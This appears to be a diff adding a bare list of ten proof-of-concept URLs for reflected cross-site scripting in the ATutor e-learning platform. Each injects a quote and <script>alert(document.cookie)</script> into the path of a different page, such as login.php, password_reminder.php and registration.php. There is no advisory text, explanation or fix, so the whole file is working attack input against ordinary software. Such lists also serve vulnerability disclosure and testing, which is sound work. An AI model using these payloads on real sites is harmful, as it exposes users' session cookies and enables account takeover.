@@ -1,0 +1,10 @@
+http://www.example.com/ATutor/themes/default/tile_search/index.tmpl.php/&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ATutor/login.php/index.php&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/search.php/index.php&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/password_reminder.php&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/login.php/jscripts/infusion/&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/login.php/mods/_standard/flowplayer/&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/browse.php/jscripts/infusion/framework/fss/&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/registration.php/themes/default/ie_styles.css&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/about.php/&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php
+http://www.example.com/ATutor/themes/default/social/basic_profile.tmpl.php/&quot; &lt;script&gt;alert(document.cookie)&lt;/script&gt;/index.php 
